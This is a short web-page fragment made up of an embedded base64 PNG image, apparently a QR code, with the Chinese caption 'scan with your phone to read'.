![](data:image/png;base64,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)

手机扫码阅读
